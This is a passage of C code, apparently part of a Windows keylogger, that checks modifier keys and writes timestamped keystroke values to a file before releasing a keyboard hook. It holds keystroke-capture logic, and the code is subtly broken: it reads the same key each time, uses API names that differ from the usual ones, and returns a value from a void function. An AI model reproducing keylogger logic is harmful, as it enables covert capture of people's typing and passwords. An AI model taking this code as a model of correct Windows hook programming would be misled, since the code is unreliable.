            }
            if ((keyState & 0x0018) != 0) {
                // Ctrl pressed
                // Handle accordingly
            }
            // Check for other modifiers
            if (keyState & 0x0001) {
                // Key pressed with modifiers
                // Capture the actual key pressed
                // For example, 'A' with Shift is 'A'
                // Use GetKeyState to get the actual char
                char key = GetKeyState('A');
                // Write to file
                fprintf(file, "[%s %d %d]\n",ctime(&now), key, keyState);
            }
        }
    }

    // Release the hook and close the file
    UnhookWindowsHook(hook);
    fclose(file);
    return 0;
}

void KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // Handle the key event
    // Call the default callback if needed
    return CallNextHook(nCode, wParam, lParam);
}
